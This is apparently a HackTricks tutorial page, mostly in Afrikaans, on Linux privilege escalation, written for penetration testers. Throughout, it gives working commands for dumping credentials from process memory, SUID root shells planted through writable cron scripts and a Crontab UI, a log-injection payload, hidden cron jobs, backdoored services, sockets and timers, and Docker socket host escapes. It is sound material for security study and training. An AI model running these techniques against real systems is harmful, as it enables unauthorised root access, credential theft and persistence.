# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS inligting

Kom ons begin om inligting oor die hardloopende OS te versamel
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skryfregte op enige gids binne die `PATH`-veranderlike** het, kan jy dalk sekere libraries of binaries kaap:
```bash
echo $PATH
```
### Omgewingsinligting

Enige interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kernel-weergawe en kyk of daar 'n exploit bestaan wat gebruik kan word om escalate privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernel-weergawes en sommige reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ander webwerwe waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel-weergawes vanaf daardie web te onttrek, kan jy die volgende doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gereedskap wat kan help om na kernel exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, kontroleer slegs exploits vir kernel 2.x)

Soek altyd **die kernel-weergawe op Google**, dalk word jou kernel-weergawe in 'n kernel exploit genoem en dan kan jy seker wees dat daardie exploit geldig is.

Bykomende kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo weergawe

Gebaseer op die kwesbare sudo-weergawes wat verskyn in:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo-weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-weergawe vóór 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) laat onbevoorregte plaaslike gebruikers toe om hul voorregte na root op te skaal via die sudo `--chroot`-opsie wanneer die `/etc/nsswitch.conf`-lêer vanaf 'n deur die gebruiker beheerde gids gebruik word.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

Vir meer inligting, verwys na die oorspronklike [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg handtekeningverifikasie het gefaal

Kyk na **smasher2 box of HTB** vir 'n **voorbeeld** van hoe hierdie vuln uitgebuit kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Som moontlike verdedigings op

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

As jy binne 'n docker container is, kan jy probeer daaruit ontsnap:


{{#ref}}
docker-security/
{{#endref}}

## Drives

Kyk na **what is mounted and unmounted**, waar dit is en waarom. As iets unmounted is, kan jy probeer om dit te mount en kyk vir privaat inligting
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Lys nuttige binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kontroleer ook of **any compiler is installed**. Dit is nuttig as jy 'n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit op die masjien waarop jy dit gaan gebruik (of op 'n soortgelyke) te compile.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Geïnstalleerde kwesbare sagteware

Kontroleer die **weergawe van die geïnstalleerde pakkette en dienste**. Dalk is daar 'n ouer Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word vir escalating privileges…\
Dit word aanbeveel om handmatig die weergawe van die meer verdagte geïnstalleerde sagteware na te gaan.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk of daar verouderde of kwesbare sagteware op die masjien geïnstalleer is.

> [!NOTE] > _Neem kennis dat hierdie opdragte baie inligting sal toon wat meestal nutteloos sal wees, daarom word toepassings soos OpenVAS of soortgelyke aanbeveel om te kontroleer of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer privileges as wat dit behoort te hê** het (miskien 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Kontroleer ook jou privileges oor die processes binaries; dalk kan jy iemand oorskryf.

### Process monitoring

Jy kan tools soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer ’n stel vereistes vervul word.

### Process memory

Sommige dienste op ’n bediener stoor **credentials in clear text inside the memory**.\
Normaalweg het jy **root privileges** nodig om die geheue van prosesse wat aan ander gebruikers behoort te lees; daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebug word, solank hulle dieselfde uid het. Dit is die klassieke manier waarop ptracing gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs ’n ouerproses kan gedebug word.
> - **kernel.yama.ptrace_scope = 2**: slegs admin kan ptrace gebruik, aangesien dit die CAP_SYS_PTRACE bevoegdheid vereis.
> - **kernel.yama.ptrace_scope = 3**: geen prosesse mag met ptrace getrace word nie. Sodra dit gestel is, is ’n herlaai nodig om ptracing weer toe te laat.

#### GDB

As jy toegang het tot die geheue van ’n FTP-diens (byvoorbeeld) kan jy die Heap kry en binne-in sy credentials soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skrip
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID, **maps toon hoe geheue binne daardie proses se** virtuele adresruimte gekarteer is; dit wys ook die **toestemmings van elke gemapte gebied**. Die **mem** pseudo-lêer **ontbloot die proses se geheue self**. Vanaf die **maps**-lêer weet ons watter **geheuegebiede leesbaar is** en hul verskuiwings. Ons gebruik hierdie inligting om **in die mem-lêer te seek en alle leesbare gebiede te dump** na 'n lêer.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan met /dev/kmem bereik word.\
Tipies is `/dev/mem` slegs leesbaar deur **root** en die kmem groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump is 'n Linux-herverbeelding van die klassieke ProcDump tool uit die Sysinternals-suite van gereedskap vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om 'n proses se geheue te dump, kan jy die volgende gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig die root-vereistes verwyder en die proses wat aan jou behoort dump
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is vereis)

### Kredensiële uit Prosesgeheue

#### Handmatige voorbeeld

As jy vind dat die authenticator proses loop:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die proses dump (sien vorige afdelings vir verskillende maniere om die geheue van 'n proses te dump) en vir inloginligting in die geheue soek:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **steal clear text credentials from memory** en uit sommige **well known files**. Dit vereis root privileges om behoorlik te werk.

| Kenmerk                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geskeduleerde/Cron take

### Crontab UI (alseambusher) wat as root loop – web-based scheduler privesc

As ’n web “Crontab UI” paneel (alseambusher/crontab-ui) as root loop en slegs aan loopback gebind is, kan jy nog steeds daarby kom via SSH local port-forwarding en ’n bevoorregte taak skep om privilegies te verhoog.

Tipiese ketting
- Ontdek loopback-only poort (e.g., 127.0.0.1:8000) en Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Vind inlogbewyse in operasionele artefakte:
- Rugsteun/scripts met `zip -P <password>`
- systemd-eenheid wat `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` blootstel
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Skep 'n high-priv job en voer dit onmiddellik uit (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Gebruik dit:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Moenie Crontab UI as root laat loop nie; beperk dit tot 'n toegewyde gebruiker en slegs minimale permissies
- Bind aan localhost en beperk verder toegang via firewall/VPN; moenie wagwoorde hergebruik nie
- Vermy om secrets in unit files in te bed; gebruik secret stores of root-only EnvironmentFile
- Skakel audit/logging aan vir on-demand job executions

Kontroleer of enige scheduled job kwesbaar is. Miskien kan jy voordeel trek uit 'n script wat deur root uitgevoer word (wildcard vuln? kan jy lêers wat root gebruik wysig? gebruik symlinks? skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron pad

Byvoorbeeld, in _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let daarop dat die gebruiker "user" skryfbevoegdhede oor /home/user het_)

As in hierdie crontab die root gebruiker probeer om 'n opdrag of script uit te voer sonder om die PATH te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy 'n root shell kry deur te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n script met 'n wildcard gebruik (Wildcard Injection)

As 'n script deur root uitgevoer word en 'n “**\***” in 'n opdrag voorkom, kan jy dit uitbuit om onverwagte dinge te veroorsaak (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **nie).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voordat arithmetic evaluation in ((...)), $((...)) en let plaasvind. As 'n root cron/parser onbetroubare log fields lees en dit in 'n arithmetic context invoer, kan 'n aanvaller 'n command substitution $(...) inject wat as root uitgevoer word wanneer die cron loop.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Kry attacker-controlled tekst in die parsed log geskryf sodat die numeriek-agtige veld 'n command substitution bevat en op 'n syfer eindig. Maak seker jou command nie na stdout print nie (of herlei dit) sodat die arithmetic geldig bly.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

As jy 'n cron script wat deur root uitgevoer word kan wysig, kan jy baie maklik 'n shell kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Indien die script wat deur root uitgevoer word **'n directory gebruik waarop jy volle toegang het**, kan dit nuttig wees om daardie folder te verwyder en **'n symlink folder na 'n ander een te skep** wat 'n deur jou beheerde script bedien.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Op maat-ondertekende cron binaries met writable payloads
Blue teams soms "sign" cron-driven binaries deur 'n custom ELF-seksie uit te dump en te grep vir 'n vendor string voordat hulle dit as root uitvoer. As daardie binary group-writable is (bv., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) en jy kan die signing material leak, kan jy die seksie forge en die cron taak kap:

1. Gebruik `pspy` om die verifikasievloei vas te vang. In Era het root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` uitgevoer gevolg deur `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` en toe die lêer uitgevoer.
2. Herstel die verwagte certificate met die leaked key/config (van `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Bou 'n kwaadwillige vervanging (bv., drop 'n SUID bash, voeg jou SSH key by) en embed die certificate in `.text_sig` sodat die grep slaag:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Oorskryf die geskeduleerde binary terwyl jy die execute bits behou:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wag vir die volgende cron-run; sodra die naïewe signature check slaag, word jou payload as root uitgevoer.

### Gereelde cron jobs

Jy kan die processes monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit benut en escalate privileges.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **op minder-uitgevoerde commands te sorteer**, en die commands wat die meeste uitgevoer is te verwyder, kan jy die volgende doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik maak van** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses wat begin monitor en lys).

### Onsigbare cron jobs

Dit is moontlik om 'n cronjob te skep deur 'n **carriage return na 'n kommentaar te plaas** (sonder newline character), en die cron job sal werk. Voorbeeld (let op die carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kyk of jy enige `.service`-lêer kan skryf, as jy dit kan, **kan jy dit wysig** sodat dit **jou backdoor uitvoer wanneer** die diens **gestart**, **herbegin** of **gestop** word (miskien moet jy wag totdat die masjien herbegin word).\
Byvoorbeeld skep jou backdoor binne die `.service`-lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare service binaries

Hou in gedagte dat as jy **skryfregte oor binaries wat deur services uitgevoer word** het, kan jy hulle verander na backdoors sodat wanneer die services weer uitgevoer word die backdoors uitgevoer sal word.

### systemd PATH - Relatiewe paaie

Jy kan die PATH wat deur **systemd** gebruik word sien met:
```bash
systemctl show-environment
```
As jy vind dat jy in enige van die gidse van die pad kan **skryf**, mag jy dalk in staat wees om **escalate privileges**. Jy moet soek na **relatiewe paaie wat in dienskonfigurasie-lêers gebruik word** soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Skep dan 'n **uitvoerbare** met die **dieselfde naam as die relative path binary** binne die systemd PATH-gids wat jy kan skryf, en wanneer die diens gevra word om die kwetsbare aksie (**Start**, **Stop**, **Reload**) uit te voer, sal jou **backdoor** uitgevoer word (onbevoorregte gebruikers kan gewoonlik nie dienste begin/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd unit-lêers waarvan die naam op `**.timer**` eindig en wat `**.service**` lêers of gebeurtenisse beheer. **Timers** kan as 'n alternatief vir cron gebruik word, aangesien hulle ingeboude ondersteuning het vir kalender-tydgebeurtenisse en monotone tydgebeurtenisse, en asook asynchroon uitgevoer kan word.

Jy kan al die timers opnoem met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy dit laat sekere systemd.unit-eenhede uitvoer (soos `.service` of `.target`).
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Unit is:

> Die unit wat geaktiveer word wanneer hierdie timer verstryk. Die argument is 'n unit-naam, wie se agtervoegsel nie ".timer" is nie. Indien nie gespesifiseer nie, val hierdie waarde terug na 'n service wat dieselfde naam as die timer unit het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die unit-naam wat geaktiveer word en die unit-naam van die timer unit identies benoem word, behalwe vir die agtervoegsel.

Daarom, om hierdie toestemming te misbruik sal jy nodig hê om:

- Vind 'n systemd unit (soos 'n `.service`) wat 'n **writable binary** uitvoer
- Vind 'n systemd unit wat 'n **relative path** uitvoer en jy het **writable privileges** oor die **systemd PATH** (om daardie executable na te boots)

**Leer meer oor timers met `man systemd.timer`.**

### **Aktiveer Timer**

Om 'n timer te aktiveer benodig jy root privileges en om uit te voer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Standaard: false**. Vir prestasie-redes word dit aanbeveel om nuwe daemons slegs so te skryf dat hulle geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer opdraglyne wat **uitgevoer word voordat** of **na** die luisterende **sockets**/FIFOs **geskep** en gebind is, onderskeidelik. Die eerste token van die opdraglyn moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Addisionele **opdragte** wat **uitgevoer** word voordat of nadat die luisterende **sockets**/FIFOs onderskeidelik **gesluit** en verwyder is.
- `Service`: Spesifiseer die naam van die **service**-eenheid wat **geaktiveer** moet word by **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sockets met `Accept=no`. Dit is standaard die service wat dieselfde naam as die socket dra (met die agtervoegsel vervang). In meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Skryfbare .socket lêers

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Skryfbare sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumereer Unix Sockets
```bash
netstat -a -p --unix
```
### Ruwe verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Let wel dat daar moontlik sommige **sockets listening for HTTP** requests is (_ek praat nie van .socket files nie, maar van die lêers wat as unix sockets optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
As die socket **reageer met 'n HTTP** versoek, kan jy **kommunikeer** daarmee en moontlik **exploit some vulnerability**.

### Skryfbare Docker Socket

Die Docker socket, dikwels gevind by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Standaard is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. Om skryf toegang tot hierdie socket te hê, kan lei tot privilege escalation. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation with Docker CLI**

As jy skryf toegang tot die Docker socket het, kan jy escalate privileges deur die volgende opdragte te gebruik:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Others

Neem kennis dat as jy skryfpermitte oor die docker-sok het omdat jy **binne die groep `docker`** is jy [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is a gesofistikeerde inter-Process Communication (IPC) system wat toepassings in staat stel om doeltreffend met mekaar te kommunikeer en data te deel. Ontwikkel met moderne Linux-stelsels in gedagte, bied dit 'n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.

